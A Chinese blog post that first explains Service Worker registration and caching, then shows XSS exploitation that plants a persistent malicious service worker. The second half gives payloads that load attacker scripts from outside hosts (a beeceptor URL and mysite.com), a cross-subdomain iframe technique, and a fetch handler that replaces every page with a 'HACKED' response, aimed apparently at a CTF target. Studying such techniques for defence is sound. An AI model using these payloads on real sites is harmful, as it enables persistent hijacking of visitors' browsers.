date: 2020-10-15
categories:
- web
tags:
- js
- xss
- web
title:  Service Worker
---
# Service Worker

## Service Worker 学习



### 配置检查

在已经支持 serivce workers 的浏览器的版本中，很多特性没有默认开启。如果你发现示例代码在当前版本的浏览器中怎么样都无法正常运行，你可能需要开启一下浏览器的相关配置：

- **Firefox Nightly**: 访问 `about:config` 并设置 `dom.serviceWorkers.enabled` 的值为 true; 重启浏览器；
- **Chrome Canary**: 访问 `chrome://flags` 并开启 `experimental-web-platform-features`; 重启浏览器 (注意：有些特性在Chrome中没有默认开放支持)；
- **Opera**: 访问 `opera://flags` 并开启` ServiceWorker 的支持`; 重启浏览器。 

另外，你需要通过 HTTPS 来访问你的页面 — 出于安全原因，**Service Workers 要求必须在 HTTPS 下才能运行。Github 是个用来测试的好地方，因为它就支持HTTPS。为了便于本地开发，`localhost` 也被浏览器认为是安全源。**

### 注意点

1. Service Workers 要求必须在 HTTPS 或者 localhost 下才能运行
2. Service Workers 要求尽可能的异步操作



### Service Workers 的注册及安装

通过`serviceWorkerContainer.register()`来注册一个Service Workers

eg.

```javascript
if ('serviceWorker' in navigator) {
  navigator.serviceWorker.register('/sw-test/sw.js', { scope: '/sw-test/' }).then(function(reg) {
    // registration worked
    console.log('Registration succeeded. Scope is ' + reg.scope);
  }).catch(function(error) {
    // registration failed
    console.log('Registration failed with ' + error);
  });
}
```

其中scope为Service Workers的作用域，默认是scriptURL(`/sw-test/sw.js`)所在的文件夹及其子文件夹，scope的选择范围只能是scriptURL所在的文件夹或者子文件夹，且不能影响其他网站，只能影响当前的域名。

scriptURL是相对于origin的URL而不是相对于引用他的那个JS文件，当然也有例外（ `Content-Type` 必须是 `text/javascript`）

> 如果你的 service worker 被激活在一个有 `Service-Worker-Allowed` header 的客户端，你可以为service worker 指定一个最大的 scope 的列表。

安装过程：

![image1496](https://mdn.mozillademos.org/files/12636/sw-lifecycle.png)





### 处理事件

Service Workers支持的事件如下



![image1603](https://mdn.mozillademos.org/files/12632/sw-events.png)

install:安装时会触发InstallEvent

activate:安装事件之后调用activate事件

fetch:Service Workers 中的所有请求都会触发fetch事件

sync:当发起一个同步请求是会触发sync事件







```javascript
this.addEventListener('install', function(event) {
  event.waitUntil(
    caches.open('v1').then(function(cache) {
      return cache.addAll([
        '/sw-test/',
        '/sw-test/index.html',
        '/sw-test/style.css',
        '/sw-test/app.js',
        '/sw-test/image-list.js',
        '/sw-test/star-wars-logo.jpg',
        '/sw-test/gallery/',
        '/sw-test/gallery/bountyHunters.jpg',
        '/sw-test/gallery/myLittleVader.jpg',
        '/sw-test/gallery/snowTroopers.jpg'
      ]);
    })
  );
});

self.addEventListener('activate', function(event) {
  var cacheWhitelist = ['v2'];

  event.waitUntil(
    caches.keys().then(function(keyList) {
      return Promise.all(keyList.map(function(key) {
        if (cacheWhitelist.indexOf(key) === -1) {
          return caches.delete(key);
        }
      }));
    })
  );
});

self.addEventListener('fetch', function(event) {
  event.respondWith(
    caches.match(event.request).then(function(resp) {
      return resp || fetch(event.request).then(function(response) {
        return caches.open('v1').then(function(cache) {
          cache.put(event.request, response.clone());
          return response;
        });  
      });
    })
  );
});
```





## Service Worker With XSS



### XSS简单示范



通过Service Worker 可以持久的控制受害者

利用条件如下：

1. 一个xss点
2. MIME TYPE 为 application/javascript的可控页面（通常是jsonp）



`index.php?xss=navigator.serviceWorker.register("/sw/jsonp.php?xss=importScripts(%27https://serviceworker.free.beeceptor.com/exp.js%27);");`



exp.js

```
self.addEventListener('fetch', function(event) {
  event.respondWith(new Response('<h1 style="color:red">HACKED</h1>',{headers: { 'Content-Type': 'text/html' }}));
});
```

### 利用Service Workers 控制主站及其子站点

假设在A.evil.com上存在XSS点，B.evil.com上存在可控jsonp，

那么我们可以通过设置`document.domain="evil.com"`，嵌入一个iframe（src=B.evil.com），然后执行恶意代码插入Service Workers

A站点执行(使用self.skipWaiting()使的Service Workes 控制当前界面)

```javascript
document.domain="evil.com";
a=document.createElement("iframe");
a.src="https://B.evil.com/";
document.body.append(a);
document.getElementsByTagName("iframe")[0].addEventListener("load",()=>{fuck()})
function fuck(){
    var code = `navigator.serviceWorker.register("/jsonp.php?callback=self.importScripts('//mysite.com/fuck.js')//")`;
    document.getElementsByTagName("iframe")[0].contentWindow.eval(code);
}

```

这样我们便控制住了B站点



fuck.js

```javascript
document.domain="hardxss.xhlj.wetolink.com";
a=document.createElement("iframe");
a.src="https://auth.hardxss.xhlj.wetolink.com";
document.body.append(a);
document.getElementsByTagName("iframe")[0].addEventListener("load",()=>{fuck()})
function fuck(){
    var code = `navigator.serviceWorker.register("/api/loginStatus?callback=self.importScripts('//serviceworker.free.beeceptor.com/exp.js');//")`;
    document.getElementsByTagName("iframe")[0].contentWindow.eval(code);
}

```



exp.js

```
self.addEventListener('fetch', function(event) {
  event.respondWith(new Response('<h1 style="color:red">HACKED</h1>',{headers: { 'Content-Type': 'text/html' }}));
});


```









## 参考

教程：https://developer.mozilla.org/zh-CN/docs/Web/API/Service_Worker_API/Using_Service_Workers

API：https://developer.mozilla.org/zh-CN/docs/Web/API/Service_Worker_API

https://lightless.me/archives/XSS-With-Service-Worker.html